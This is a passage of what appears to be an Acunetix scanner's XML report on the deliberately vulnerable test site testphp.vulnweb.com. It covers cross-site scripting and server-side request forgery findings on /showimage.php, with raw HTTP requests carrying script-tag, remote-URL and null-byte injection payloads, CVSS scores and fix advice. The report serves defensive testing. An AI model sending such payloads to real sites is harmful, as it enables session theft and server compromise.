          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Source Code Disclosure]]></Database>
          <URL><![CDATA[http://www.imperva.com/resources/glossary?term=source_code_disclosure]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="27" color="red">
       <Name><![CDATA[Cross site scripting]]></Name>
       <ModuleName><![CDATA[Scripting (Remote_File_Inclusion_XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">http://testasp.vulnweb.com/t/xss.html?%00.jpg</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:41 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 33
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="28" color="red">
       <Name><![CDATA[Server side request forgery]]></Name>
       <ModuleName><![CDATA[Scripting (Server_Side_Request_Forgery.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">http://hit1n7oY9eLjN.bxss.me/</font></b><br/><br/>An HTTP request was initiated for the domain <b>hit1n7oY9eLjN.bxss.me </b> which indicates that this script is vulnerable to SSRF (Server Side Request Forgery).<br/><br/>HTTP request details: <br/><pre wrap="virtual">IP address: 176.28.50.165
User agent: </pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[The impact varies according to the affected server interface.]]></Impact>
       <Description><![CDATA[SSRF as in Server Side Request Forgery is a vulnerability that allows an attacker to force server interfaces into sending packets initiated by the victim server to the local interface or to another server behind the firewall. Consult Web References for more information about this problem.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should properly sanitize user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=http://hit1n7oY9eLjN.bxss.me/ HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:42 GMT
Content-Type: image/jpeg
Connection: close
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 1891
]]></Response>
       </TechnicalDetails>
       <CWE id="918"><![CDATA[CWE-918]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[5.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H]]></Descriptor>
          <Score><![CDATA[9]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[High]]></A>
          <Adesc><![CDATA[There is total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed).]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[SSRF VS. BUSINESS-CRITICAL APPLICATIONS]]></Database>
          <URL><![CDATA[https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="29" color="orange">
       <Name><![CDATA[Cross site scripting (content-sniffing)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">./pictures/5.jpg'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;JsHH(9703)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This type of XSS can only be triggered on (and affects) content sniffing browsers.</font></div><br/>This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=./pictures/5.jpg'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;JsHH(9703)&lt;/ScRiPt&gt; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:43 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 405
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
